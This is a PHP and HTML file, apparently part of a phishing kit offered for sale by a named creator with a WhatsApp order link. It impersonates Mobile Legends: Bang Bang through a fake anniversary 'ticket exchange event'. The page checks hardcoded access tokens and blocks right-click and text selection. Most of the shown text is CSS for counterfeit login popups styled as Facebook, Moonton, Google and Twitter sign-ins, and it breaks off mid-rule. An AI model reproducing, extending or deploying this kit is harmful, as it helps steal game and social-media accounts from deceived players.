<?php
// CREATOR MAS CODX
// TOLONG HARGAI CREATOR
// Order SC: https://wa.me/6285863972648

if(isset($_POST['sessionToken']) && isset($_GET['aToken'])){
    $sessionToken = $_POST['sessionToken'];
    $aToken = $_GET['aToken'];
    
    if($sessionToken != "azf"){
        header("Location: verify.php");    
    }
    
    if($aToken != "verified"){
        header("Location: verify.php");    
    }
    ?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Mobile Legends: Bang Bang</title>
<meta property="og:description" content="Mobile Legends: Ticket Exchange Event - 10th Anniversary">
<meta property="og:image" content="https://i.postimg.cc/jdq9pLMZ/navbar-logo.jpg">
<meta property="og:image:width" content="540">
<meta property="og:image:height" content="282">
<link href="./index_files/css" rel="stylesheet">
<link rel="stylesheet" href="https://images.cahyosr.my.id/css/13/google.css">
<link rel="stylesheet" href="https://images.cahyosr.my.id/css/13/moonton.css">
<link rel="stylesheet" href="https://images.cahyosr.my.id/css/13/facebook.css">
<link rel="stylesheet" href="https://images.cahyosr.my.id/css/13/animate.css">
<link rel="stylesheet" href="https://images.cahyosr.my.id/css/13/style-zone.css">
<link rel="stylesheet" href="https://images.cahyosr.my.id/css/13/style2.css">
<link rel="stylesheet" href="https://images.cahyosr.my.id/css/13/zero-zone.css">
<link href="https://fonts.googleapis.com/css2?family=Teko&display=swap" rel="stylesheet">
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
<link rel="icon" type="img/png" href="https://images.cahyosr.my.id/img/13/style-img/icon_2.webp" sizes="32x32">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
<style type="text/css">
@charset "utf-8";
@import url("https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Teko:300,400,500");

*,
*:before,
*:after {
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
}

:root {
    --color-primary-bg: #1f2138;
    --color-bg-container: #373b6b;
    --color-fill-seventh: #45497b;
    --color-text: #ffffff;
    --color-text-secondary: #888baf;
    --color-text-tertiary: #a0a4ce;
    --color-text-warnning: #ff6565;
    --color-text-emphasize: #ffb759;
    --color-text-important: #8f9aff;
    --color-text-hightlight: #b8bfff;
    --color-text-quaternary: #7d81b4;
    --color-text-fifthly: #7d81b4;
    --color-text-active: #73ff3c;
    --color-border-recharge: #5a61a2;
    --color-border-recharge-active: #7683ff;
    --color-bg-recharge-start: #2d3157;
    --color-bg-recharge-end: #3e4371;
    --color-bg-recharge-name: #2f3357;
    --color-border-secondary: #62689e;
    --color-bg-channel-start: #2e314f;
    --color-bg-channel-end: #464a7a;
    --color-bg-channel-gift-start: #373958;
    --color-bg-channel-gift-end: #686ba0;
    --color-gift-start: #30345f 100%;
    --color-gift-end: #4d528b 100%;
    --color-bg-footer: #151624;
    --color-close-icon: #7d81b4;
    --color-border-input: #3d4278;
    --color-bg-input: #252746;
    --color-bg-button-primary-start: #6473ff;
    --color-bg-button-primary-end: #4c59db;
    --color-bg-button-secondary: #7683ff;
    --color-bg-button-gray-start: #8b8d9c;
    --color-bg-button-gray-end: #686977;
    --color-bg-coupon-start: #6f8fe0;
    --color-bg-coupon-end: #3a3dc1;
    --color-bg-coupon-status-unused: #6e71fe;
    --color-bg-modal: #313457;
    --color-bg-modal-title: #40436f;
    --color-bg-tab: #2a2c4c;
    --color-bg-tab-active: #7683ff;
    --color-warning: #ff5e5e;
    --color-warning-secondary: #622c2c;
    --color-fill: #363963;
    --color-fill-secondary: #2e314f;
    --color-fill-tertiary: #464a7a;
    --color-fill-quaternary: #252746;
    --color-fill-fifthly: #6473ff;
    --color-fill-sixthly: #4c59db;
    --color-border: #4c518b;
    --color-border-quaternary: #494e92;
    --color-border-active: #7683ff;
    --color-bg-paypopup: #464a7a;
}

@font-face {
	font-family: 'laza';
	font-style: normal;
	font-weight: 700;
	src:
		url(fonts/laza.woff2) format("woff2"),
		url(fonts/laza.woff) format("woff"),
		url(fonts/laza.ttf) format("truetype");
}

@font-face {
	font-family: 'laza2';
	font-style: normal;
	font-weight: 700;
	src:
		url(fonts/laza2.ttf) format("truetype")
}

@font-face {
	font-family: 'laza';
	font-style: normal;
	src:
		url(fonts/laza-latin.otf) format("opentype");
}
@font-face {
	font-family: 'laza4';
	font-style: normal;
	src:
		url(fonts/laza-extrabold.otf) format("opentype");
}

.laz-container {
	background: url(https://images.cahyosr.my.id/img/13/lazback.jpg) no-repeat center;
	background-size: 100% 100%;
	background-blend-mode: darken, luminosity;
	margin-top: 0px;
	padding: 5px;
	width: 100%;
	margin-left: 0px;
	margin-right: 0px;
	height: 480px;
	position: relative;
}


.gallery-container {
	background-size: 100% 100%;
	margin-top: -2px;
	width: 100%;
	height: auto;
	border: 0px solid #fff;
	float: left;
}

.container-box {
	background-size: 100% 100%;
	width: 100%;
	height: 690px;
}

.landing {
	background: url(https://images.cahyosr.my.id/img/13/landing.jpg) no-repeat center center;
	background-size: cover;
	width: 100%;
	height: auto;
}

.navbar {
	margin-top: -8px;
    background: #0f1320;
    width: 100%;
    height: 65px;
}

.navbar-logo {
    width: 97px;
    float: left;
    margin-top: 13px;
    margin-left: 13px;
}

.navbar-shop {
	width: 25px;
	margin-top: 19px;
	margin-right: 20px;
}

.navbar-language {
	width: 93px;
    margin-top: 8px;
    margin-left: 11px;
    float: left;
}

.navbar-menu {
	width: 53px;
	margin-top: 11px;
	margin-right: 7px;
	float: right;
}

.navbar-right {
	width: auto;
	float: right;
}

.navbar-download {
	background: #ffca13;
	width: 46px;
	height: 45px;
	margin-top: 10px;
	margin-right: 10px;
	border-radius: 7px;
	float: right;
}

.navbar-download img {
	width: 20px;
	height: 21px;
	margin: 13px;
}


.header {
	width: 100%;
	height: auto;
}

.header img {
	width: 100%;
	height: auto;
	margin-top: -0px;
}


.balance2 {
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 7px;
	padding: 5px;
	display: block;
}

.balance2 img {
	width: 100px;
	margin-top: -10px;
	margin-right: 5px;
	float: center;
}

.balance2-nom {
	color: #fff;
	font-size: 18px;
	padding-top: 8px;
	font-family: laza;
	font-weight: 500;
	text-align: left;
	text-shadow: 0 1px 0 #000;
}

.balance2-detail {
	width: auto;
	height: auto;
	padding-top: 2px;
	padding-left: 5px;
	padding-bottom: 0px;
	color: #fff;
	font-size: 15px;
	font-family: laza;
	text-align: center;
	text-shadow: 0 1px 0 #000;
	border-left: 3px solid #9FE9F7;
	line-height: 15px;
	float: left;
}

.balance2 button {
	background-size: 100% 100%;
	width: 30%;
	height: auto;
	margin-top: -75px;
	margin-right: 10px;
	padding: 5px;
	color: #000;
	font-size: 14px;
	font-family: laza;
	text-align: center;
	border: none;
	outline: none;
	position: relative;
	float: right;
}

.balance {
	background: url(https://images.cahyosr.my.id/img/13/lazabz.png) no-repeat center center;
    background-size: 100% 100%;
    width: 73%;
    height: 71px;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: -9px;
    padding: 5px;
    border-top: 0px solid #70FFB2;
    border-left: 0px solid #70FFB2;
    border-right: 0px solid #70FFB2;
    border-bottom: 0px solid #70FFB2;
    display: block;
}

.balance img {
	width: 57px;
	border-top: 0px solid #1E90FF;
	border-left: 0px solid #1E90FF;
	border-right: 0px solid #1E90FF;
	border-bottom: 0px solid #1E90FF;
	margin-top: -1px;
	margin-right: 5px;
	float: left;
}

.balance-nom {
	color: #fff;
	font-size: 14px;
	padding-top: 13px;
	padding-bottom: 4px;
	font-family: laza;
	/* font-weight: 500; */
	text-align: left;
	/* text-shadow:0 1px 0 #000; */
}

.balance-detail {
	background: url(https://images.cahyosr.my.id/img/13/bg-det.png) no-repeat center center;
	background-size: 100% 100%;
	width: auto;
	height: auto;
	padding-top: 1px;
	padding-left: 5px;
	padding-right: 8px;
	padding-bottom: 3px;
	color: #fff;
	font-size: 13px;
	font-family: 'laza';
	text-align: center;
	text-shadow: 0 1px 0 #000;
	border-left: 3px solid #FAB203;
	line-height: 15px;
	float: left;
}

.balance-detail2 {
	background: url(https://images.cahyosr.my.id/img/13/bg-det2.png) no-repeat center center;
	background-size: 100% 100%;
	width: auto;
	height: auto;
	padding-top: 2px;
	padding-left: 5px;
	padding-right: 8px;
	padding-bottom: 3px;
	color: #fff;
	font-size: 14px;
	font-family: 'laza';
	text-align: center;
	text-shadow: 0 1px 0 #000;
	border-left: 3px solid #b70303;
	line-height: 15px;
	float: left;
}

.balance-detail3 {
	background: url(https://images.cahyosr.my.id/img/13/bg-det3.png) no-repeat center center;
	background-size: 100% 100%;
	width: auto;
	height: auto;
	padding-top: 2px;
	padding-left: 5px;
	padding-right: 8px;
	padding-bottom: 3px;
	color: #fff;
	font-size: 14px;
	font-family: laza;
	text-align: center;
	text-shadow: 0 1px 0 #000;
	border-left: 3px solid #a30889eb;
	line-height: 15px;
	float: left;
}

.balance button {
	background: url(https://images.cahyosr.my.id/img/13/lazbutton.png) no-repeat center center;
	background-size: 100% 100%;
	width: 30%;
	height: 33px;
	margin-top: -14px;
	margin-right: 0px;
	padding: 5px;
	padding-right: 21px;
	color: #000000;
	font-size: 17px;
	font-family: 'laza';
	font-weight: 500;
	text-align: right;
	text-shadow: 0 3px 0 #ffffff;
	border: none;
	outline: none;
	position: relative;
	float: right;
	animation: pulse .900s infinite alternate;
	animation-play-state: running;
}

.header video {
	width: 100%;
	border: none;
}

.slideshow-container {
	max-width: 1000px;
	position: relative;
	margin: auto;
	border-top: 1px solid #ECD954;
	border-bottom: 1px solid #ECD954;
}

.fade {
	-webkit-animation-name: fade;
	-webkit-animation-duration: 1.5s;
	animation-name: fade;
	animation-duration: 1.5s;
}

.notiftwitter {
	width: 30%;
	height: 30px;
	margin-left: 35%;
	margin-right: auto;
	padding: 5px;
	font-size: 22px;
	font-family: Teko;
	font-weight: 500;
	text-align: center;
	color: #ECD954;
	margin-bottom: 0px;
	border: none;
	position: relative;
	outline: none;
	display: block;
}

.season-logo {
	width: 20%;
	margin: 15px;
	float: left;
}

.season-logos {
	width: 40%;
	margin: 5px;
	float: right;
}

.season-slogan {
	width: 100%;
	margin-top: 100%;
	margin-left: auto;
	margin-right: auto;
	display: block;
}

.season-btn {
	background: url(https://images.cahyosr.my.id/img/13/yes_laza.png) no-repeat center;
	background-size: 100% 100%;
	width: auto;
	height: auto;
	margin-left: auto;
	margin-right: auto;
	padding: 10px;
	padding-left: 30px;
	padding-right: 30px;
	font-size: 18px;
	font-family: laza;
	font-weight: 500;
	text-align: center;
	color: #000;
	margin-bottom: 3px;
	border: none;
	position: relative;
	outline: none;
	display: block;
}

.season-btn:hover {
	background: url(https://images.cahyosr.my.id/img/13/menu_on.png) no-repeat center;
	background-size: 100% 100%;
	color: #000;
	transition: 0.5s;
}

.subject-event {
	font-style: normal;
    margin-top: -45px;
    margin-left: 156px;
    color: #ffffff;
    text-shadow: 3px 3px 3px #000000;
    font-family: arial;
    font-weight: 700;
    font-size: 17px;
    position: absolute;
}

.event-title {
    background: #523e29;
    background-size: 100% 100%;
    width: 100%;
    height: 6px;
    margin-top: -6px;
    margin-left: -5px;
    display: block;
    position: absolute;
}

.event-title2 {
    background: #523e29;
    background-size: 100% 100%;
    width: 100%;
    height: 6px;
    margin-top: 470px;
    margin-left: -5px;
    display: block;
    position: absolute;
}

.event-notification {

	background-size: auto;
	background-size: 94% 100%;
	width: 85%;
	height: 48px;
	margin-left: auto;
	margin-right: auto;
	margin-top: -2px;
	margin-bottom: -82px;
	display: block;
}

.event-notification-text {
	padding-top: 10px;
	padding-left: 59px;
	color: #dbff85;
	font-size: 16px;
	font-family: Teko;
	font-weight: 550;
	text-align: left;
	float: left;
}

.event-notification-timer {
	padding-top: 44px;
	padding-right: 28px;
	color: #dbff85;
	font-size: 27px;
	font-family: Teko;
	font-weight: 550;
	text-align: left;
	margin-bottom: 13px;
	float: right;
}

.alert-wrapper {
	width: 98%;
	height: auto;
	border: none;
	margin-left: 10px;
	display: block;
	margin: 10px auto;
	margin-top: -31px;
	margin-bottom: -17px;
}

.alert {

	background-size: auto;
	background-size: 100% 100%;
	width: 91%;
	height: 62px;
	margin-top: 29px;
	margin-bottom: 18px;
	padding: 14px;
	margin-left: 5px;
	margin-right: 100px;
	color: #fff;
	border: none;
}

.alert2 {

	background-size: auto;
	background-size: 78% 80%;
	width: 91%;
	height: 62px;
	margin-top: 29px;
	margin-bottom: 18px;
	padding: 14px;
	margin-left: 16px;
	margin-right: 100px;
	color: #fff;
	border: none;
}

.alert-text {
	margin-top: -330px;
	margin-left: -6px;
	padding: 7px;
	color: #ffffff;
	text-align: center;
	font-size: 14px;
	font-family: laza;
	border: none;
}

.alert-text-mid {
	margin-top: 1px;
	padding: 7px;
	color: #f1f1f0;
	text-align: center;
	font: 25px;
	font-family: laza;
	border: none;
	margin-right: -2px;
	font-size: 19px;
}

.loadkin {
	width: 100%;
	height: 100%;
	position: fixed;
	top: 0;
	left: 0;
	z-index: 9999;
	background: #000;
}

.loadkin-box {
	position: relative;
	margin: 50px auto;
	text-align: center;
	height: 43px;
	font-size: 20px;
	padding: 5px;
	padding-bottom: 5px;
	margin-top: 70%;
}

.loadkin-box img {
	width: 70px;
	height: 85px;
	margin-bottom: 10px;
}

.loadkin-box i {
	padding-top: 15px;
	padding-bottom: 15px;
	color: #fff;
	font-size: 20px;
	float: center;
	font-family: arial, sans-serif;
	text-align: center;
}

.popup {
	width: 100%;
	height: 100%;
	position: fixed;
	top: 0;
	left: 0;
	z-index: 9999;
	background-color: rgba(0, 0, 0, 0.4);
}

.popup-box-wrapper {
	width: auto;
	height: auto;
	position: relative;
	margin: 50px auto;
	margin-top: 15%;
	text-align: center;
	font-family: 'laza';
	color: #fff;
}

.popup-box-wrapperz {
	width: 390px;
	height: auto;
	position: relative;
	margin: 50px auto;
	margin-top: 15%;
	text-align: center;
	font-family: 'laza';
	color: #fff;
}

.popup-box-navbar {
	background: url(https://images.cahyosr.my.id/img/13/popup-navbar2.png) no-repeat center center;
	background-size: 100% 100%;
	height: 43px;
	padding-bottom: 5px;
}

.popup-box-navbar img {
	width: 25px;
	height: 25px;
	margin-top: 7px;
	margin-right: 15px;
	float: right;
}

.popup-box-navbar-title {	
    padding-top: 9px;
    padding-left: 0px;
    padding-bottom: 2px;
    font-size: 15px;
    font-family: laza;
    font-weight: 300;
    text-align: center;
    color: #e5e5e5;
}

.popup-box-navbarz {
	background: url(https://images.cahyosr.my.id/img/13/popup-navbar2.png) no-repeat center center;
	background-size: 100% 100%;
	height: 43px;
	padding-bottom: 5px;
}

.popup-box-navbarz img {
	width: 25px;
	height: 25px;
	margin-top: 7px;
	margin-right: 15px;
	float: right;
}

.popup-box-navbarz-title {
	padding-top: 9px;
	padding-bottom: 2px;
	font-size: 20px;
	font-family: laza;
	font-weight: 300;
	text-align: center;
	color: #fff;
}

.popup-box-navbar-lz {
	background: url(https://images.cahyosr.my.id/img/13/popup-navbar2.png) no-repeat center center;
	background-size: 100% 100%;
	height: 56px;
	padding-bottom: 5px;
}

.popup-box-navbar-lz img {
    width: 20px;
    height: auto;
    margin-top: 7px;
    margin-right: 15px;
    float: right;
}

.popup-box-navbar-lz-title {
	padding-top: 14px;
    padding-bottom: 2px;
    padding-left: 1px;
    font-size: 17px;
    font-family: 'laza';
    font-weight: 900;
    text-align: center;
    color: #ffffff;
}

.popup-box-bg {
	background: url(https://images.cahyosr.my.id/img/13/popup-box-bg2.png) no-repeat center center;
	background-size: 100% 100%;
	width: 400px;
}

.popup-box-bgz {
	background: url(https://images.cahyosr.my.id/img/13/popup-box-bg2.png) no-repeat center center;
	background-size: 100% 100%;
	width: 100%;
	margin-top: -12px;
	margin-left: 0px;
}

.popup-box-lz {
	background: url(https://images.cahyosr.my.id/img/13/popup-box-bg2.png) no-repeat center center;
	background-size: 100% 100%;
	width: 100%;
	margin-top: -12px;
	margin-left: 0px;
}
.bgrew {
	background: #c61e45;
    width: 76%;
    height: 37%;
    position: absolute;
    margin-left: 43px;
    margin-top: -2px;
    border: 1.5px solid #ffffff;
}

.popup-box-bgx {
	background: url(https://images.cahyosr.my.id/img/13/popup-box-bg2.png) no-repeat center center;
	background-size: 100% 100%;
	width: 100%;
	margin-top: 0px;
	margin-left: 0px;
	font-size: 18px;
	padding-bottom: auto;
	padding-top: 30px;
}

.loginpop {
	background: url(https://images.cahyosr.my.id/img/13/lazlogin.png) no-repeat center center;
	background-size: 100% 100%;
	width: 400px;
	height: 200px;
	margin: 50px auto;
	text-align: center;
	margin-top: 300px;

}

.popup-box-gamecon {
	width: 52%;
	height: 65px;
	margin-left: auto;
	margin-right: auto;
	margin-top: 12px;
	display: block;
}

.popup-box-alert {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #AAAAAA;
	font-size: 18px;
	font-family: laza;
	font-weight: 500;
	text-align: left;
	display: block;
}

.popup-box-alert2 {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #AAAAAA;
	font-size: 18px;
	font-family: laza;
	font-weight: 500;
	text-align: left;
	display: block;
}

.popup-box-alert0 {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #AAAAAA;
	font-size: 18px;
	font-family: laza;
	font-weight: 500;
	text-align: right;
	display: block;
}

.popup-box-alert3 {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #000000;
	font-size: 15px;
	font-family: laza;
	font-weight: 500;
	text-align: center;
	/* font-style: italic; */
	display: block;
}


.popup-box-alert7 {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #F5EAB0;
	font-size: 18px;
	font-family: laza;
	font-weight: 500;
	text-align: center;
	display: block;
}

.popup-box-alertsz {
	width: 95%;
	height: auto;
	margin-top: 26px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: -94px;
	padding: 55px;
	color: #fdffff;
	font-size: 18px;
	font-family: laza;
	font-weight: 500;
	text-align: center;
	display: block;
}

.popup-box-alert-lz {
    width: 95%;
    height: auto;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: 2px;
    padding: 18px;
    color: #000000;
    font-size: 15px;
    font-family: 'laza';
    font-weight: 500;
    text-align: center;
    display: block;
}

.popup-box-alert4 {
	width: 95%;
    height: auto;
    margin-top: 2px;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: 2px;
    padding: 12px;
    color: #000000;
    font-size: 16px;
    font-family: laza;
    font-weight: 500;
    text-align: center;
    display: block;
}

.popup-box-alert4 i {
	padding-top: 15px;
	padding-bottom: 15px;
	color: #c72045;
	font-size: 50px;
	text-align: center;
}

.popup-box-alert-login {
	width: 95%;
    height: auto;
    margin-top: 1px;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: 15px;
    padding: 3px;
    color: #ffffffad;
    font-size: 12px;
    font-family: arial;
    font-weight: 200;
    text-align: center;
    display: block;
}
.popup-box-alert-login i {
	padding-top: 15px;
	padding-bottom: 15px;
	color: #AAAAAA;
	font-size: 50px;
	text-align: center;
}

.line {
    width: 245%;
    height: auto;
    margin-left: 84px;
    margin-top: -85px;
    padding-top: 25px;
    padding-bottom: 20px;
    border-bottom: 1px solid #ffffff;
    display: block;
}

.popup-box-item {
	width: 16%;
    height: 67px;
    margin-top: 38px;
	margin-left: auto;
	margin-right: auto;
	text-align: right;
	display: block;
}

.popup-box-item img {
	width: 100%;
	height: 100%;
}

.popup-box-item span {
	background-size: 56% 100%;
	width: auto;
	color: #fff;
	font-size: 13px;
	font-family: laza;
	text-align: right;
	position: absolute;
	top: 57px;
    right: 4px;
}

.popup-box-item rw {
	background-size: 56% 100%;
    width: 255%;
    color: #ffffff;
    text-shadow: 1px 1px 1px #000;
    font-size: 13px;
    font-family: laza;
    float: right;
    text-align: left;
    position: absolute;
    top: 18px;
    right: -216px;
}


.popup-box-item pr {
    background-size: 56% 100%;
    width: 229%;
    color: #c9c9c9;
    font-size: 13px;
    font-family: laza;
    float: right;
    text-align: left;
    position: absolute;
    top: 41px;
    right: -256px;
}

.popup-box-item prs {
    background-size: 56% 100%;
    width: 229%;
    color: #fd2121;
    font-size: 13px;
    font-family: laza;
    float: right;
    text-align: left;
    position: absolute;
    top: 41px;
    right: -256px;
	text-decoration: line-through;
}

.popup-box-alert-price {
    background-size: 56% 100%;
    width: auto;
    color: #fff;
    font-size: 13px;
    font-family: laza;
    float: right;
    position: absolute;
    top: 41px;
    right: -46px;
}

.popup-box-form {
	width: 85%;
	height: auto;
	margin-left: auto;
	margin-right: auto;
	display: block;
}

.popup-box-form label {
	display: inline-block;
	width: 140px;
	text-align: right;
	color: yellow;
}

.popup-box-form input {
	background: #1a1b1c;
	background-size: 100% 100%;
	width: 94%;
	height: 35px;
	margin-bottom: 3px;
	padding: 4px;
	padding-left: 10px;
	color: #c3c3c3;
	font-size: 13px;
	font-family: laza;
	font-weight: 300;
	border: 1px solid #8f8f8f;
	position: relative;
	outline: none;
	-webkit-appearance: none;
	-moz-appearance: none;
}

.popup-box-form input::placeholder {
	color: #FFFBF7;
}

.popup-box-form select {
	background: #1a1b1c;
	background-size: 100% 100%;
	width: 94%;
	height: 35px;
	margin-bottom: 3px;
	padding: 4px;
	padding-left: 10px;
	color: #c3c3c3;
	font-size: 13px;
	font-family: laza;
	font-weight: 300;
	border: 1px solid #8f8f8f;
	position: relative;
	outline: none;
	-webkit-appearance: none;
	-moz-appearance: none;
}

.popup-box-footer {
	background-size: 100% 100%;
	margin-top: 20px;
	width: 100%;
	height: 45px;
}

.popup-box-footer-lz {
	background-size: 100% 100%;
	margin-top: 29px;
	width: 100%;
	height: 45px;
}

.popup-box-footer-lz button {
	background: url(https://images.cahyosr.my.id/img/13/yes_laza.png) no-repeat center;
    background-size: 100% 100%;
    width: auto;
    height: auto;
    margin-top: -23px;
    padding: 0px;
    padding-left: 35px;
    padding-right: 35px;
    color: #ffffff;
    font-size: 16px;
    font-family: 'arial';
    font-weight: 500;
    margin-left: auto;
    margin-right: auto;
    text-align: center;
    border: none;
    outline: none;
}

.popup-box-footer button {
	background: url(https://images.cahyosr.my.id/img/13/yes_laza.png) no-repeat center;
	background-size: 100% 100%;
	width: auto;
	height: auto;
	margin-top: -23px;
	padding: 5px;
	padding-left: 35px;
	padding-right: 35px;
	color: #cdbdbd;
	font-size: 18px;
	font-family: laza;
	font-weight: 500;
	margin-left: auto;
	margin-right: auto;
	text-align: center;
	border: none;
	outline: none;
}

.popup-box-form-footer {
	background-size: 100% 100%;
	width: 100%;
	height: 45px;
	margin-top: 20px;
}

.popup-box-form-footer button {
	background: url(https://images.cahyosr.my.id/img/13/yes_laza.png) no-repeat center;
	background-size: 100% 100%;
	width: auto;
	height: auto;
	margin-top: 5px;
	padding: 4px;
	padding-left: 30px;
	padding-right: 30px;
	color: #000;
	font-size: 18px;
	font-family: laza;
	font-weight: 700;
	text-align: center;
	border: none;
	outline: none;
}

.popup-box-navbar-login {
	background: url(https://images.cahyosr.my.id/img/13/popup-navbar1.png) center center/100% 100% no-repeat;
	height: auto;
	padding-top: 5px;
	padding-bottom: 1px
}

.popup-box-navbar-login-title {
	padding-left: 24px;
	padding-top: 2px;
	color: #defbff;
	font-size: 22px;
	font-family: laza;
	font-weight: 500;
	text-align: center
}

.popup-box-bg-login {
	background: url(https://images.cahyosr.my.id/img/13/popup-box-bg-login.png) center center/100% 100% no-repeat;
	width: 100%;
	height: 255px;
	margin-top: -10px
}

.popup-box-bg-login-load {
	background: url(https://images.cahyosr.my.id/img/13/lazlogin.png) no-repeat center center;
	background-size: 100% 100%;
	margin-left: -20px;
	width: 400px;
	height: 200px;
	margin-top: -10px;
}

.load-login-img {
	width: 30%;
	height: auto;
	margin-top: 30px;
	margin-bottom: 5px
}

.load-login-gif {
	width: 15%;
	height: auto;
	margin-bottom: 0
}

.popup-btn-login {
	width: 78%;
    height: 40px;
    padding-top: 6px;
    padding-left: 8px;
    margin: 5px;
    font-size: 13px;
    font-family: arial;
    border: none;
    border-top-left-radius: 3px;
    border-top-right-radius: 3px;
    border-bottom-right-radius: 3px;
    border-bottom-left-radius: 3px;
    margin-bottom: -3px;
    outline: none;
    position: relative;
}

.popup-btn-login i {
	color: #fff;
	font-size: 14px;
	padding: 1px;
	float: left;
}

.popup-btn-facebook {
	background: url(https://images.cahyosr.my.id/img/13/btnlg.png);
    background-size: 100% 100%;
    color: #fff;
}

.popup-btn-moonton {
	background: url(https://images.cahyosr.my.id/img/13/btnlg.png);
    background-size: 100% 100%;
    color: #fff;
    padding-top: 11px;
}

.popup-btn-google {
	background: url(https://images.cahyosr.my.id/img/13/btnlg.png);
    background-size: 100% 100%;
    color: #fff;
    margin-bottom: 2px;
}
.popup-btn-login img {
    width: 20px;
    margin-top: -3px;
	margin-left: 3px;
    float: left;
    position: relative;
}
.popup-btn-login-link {
	background: #E3B448;
	color: #000;
}

.popup-btn-login-link img {
	width: 22px;
	height: 22px;
	margin-top: -2px;
	color: #fff;
	font-size: 20px;
	float: left;
}

.popup-login {
	background: rgba(0, 0, 0, 0.4);
	width: 100%;
	height: 100%;
	position: fixed;
	top: 0;
	left: 0;
	z-index: 9999;
}

.popup-box-login-fb {
	background: #ECEFF6;
	max-width: 330px;
	height: auto;
	position: relative;
	margin: 50px auto;
	margin-top: 10%;
	text-align: center;
	font-family: 'Teko';
	color: #000;
	border-radius: 10px;
}

.popup-box-login-moonton {
	background: -webkit-linear-gradient(top, rgb(19 48 82) 0%, rgb(58 96 133) 100%);
    max-width: 330px;
    height: auto;
    position: relative;
    margin: 50px auto;
    margin-top: 10%;
    text-align: center;
    font-family: 'Teko';
    color: #000;
    border-radius: 4px;
	border: 1px solid #1c4167;
}

.popup-box-login-twitter {
	background: #fff;
	max-width: 330px;
	height: auto;
	position: relative;
	margin: 50px auto;
	margin-top: 10%;
	text-align: center;
	font-family: 'Teko';
	color: #000;
	border-radius: 5px;
}

.popup-box-login-google {
	background:#fff;
	max-width:330px;
	height:auto;
	position:relative;
	margin:50px auto;
	margin-top:36%;
	text-align:center;
	font-family: 'Open Sans', sans-serif;
	color:#000;
	border-radius:5px;
}

.close-fb {
	background: #3b5998;
	width: 25px;
	height: 25px;
	color: #fff;
	font-size: 20px;
	text-align: center;
	text-decoration: none;
	border-radius: 50%;
	top: -10px;
	right: -10px;
	position: absolute;
	display: block;
}

.close-fb i {
	padding-top: 3px;
}

.close-other {
	background: #fff;
	width: 25px;
	height: 25px;
	color: #000;
	font-size: 20px;
	text-align: center;
	border-radius: 50%;
	top: -12px;
	right: -12px;
	position: absolute;
	z-index: 9999999;
	display: block;
}

.close-other i {
	color: #20px;
	padding-top: 3px;
}

.popups {
	width: 100%;
	height: 100%;
	position: fixed;
	top: 0;
	left: 0;
	z-index: 9999;
	background-color: rgba(0, 0, 0, 0.4);
}
.popup-box-navbar-ignis-title {
	padding-top: 21px;
    padding-bottom: 2px;
    font-size: 20px;
    font-family: 'laza';
    font-weight: 500;
    text-align: center;
    padding-right: 0;
    color: #ffffffcf;
}

.login-box {
	background: -webkit-linear-gradient(top, rgb(34 59 99) 0%, rgb(68 111 155 / 93%) 100%);
    width: 361px;
    height: auto;
    position: relative;
    margin: 50px auto;
    margin-top: 10%;
    text-align: center;
    font-family: 'Teko';
    color: #000;
    border-radius: 4px;
    border: 1px solid #1c4167;
}

.popup-box-navbar-loginz {
	background: #28446c73;
    padding-top: 10px;
    padding-bottom: 8px;
    padding-left: 0;
    color: #cae3f0;
    font-size: 14px;
    font-family: arial;
    text-align: center;
    margin-bottom: 6%;
    border-bottom: 1px solid #40658b;
    border-top-left-radius: 4px;
    border-top-right-radius: 4px;
}

.popup-box-wrappers {
	width: 390px;
	height: auto;
	position: relative;
	margin: 50px auto;
	margin-top: 15%;
	text-align: left;
	font-family: 'laza';
	color: #fff;
}

.popup-box-navbars {
	background: url(https://images.cahyosr.my.id/img/13/popup-navbar2.png) no-repeat center center;
	background-size: 100% 100%;
	height: 43px;
	padding-bottom: 5px;
}

.popup-box-navbars img {
	width: 20px;
	height: 20px;
	margin-top: 15px;
	margin-right: 18px;
	float: right;
}

.popup-box-navbars-title {
	padding-left: 40px;
	padding-top: 14px;
	padding-bottom: 2px;
	font-size: 20px;
	color: #fff;
	font-family: laza;
	font-weight: 300;
	text-align: center;
}

.kagetk {
	background: rgba(0, 0, 0, 0.2);
	background-size: 50% 50%;
	width: 80%;
	height: auto;
	margin-left: auto;
	margin-right: auto;
	border: 1px solid #fff;
	display: none;
	padding: 10px;
	color: #fff;
	font-size: 14px;
	font-family: laza;
	text-align: center;
}

.popup-box-bgs {
	background: url(https://images.cahyosr.my.id/img/13/popup-box-bg2.png) no-repeat center center;
	background-size: 100% 100%;
	width: 100%;
	height: 200px;
	margin-top: -12px;
}

.popup-box-alerts4 {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
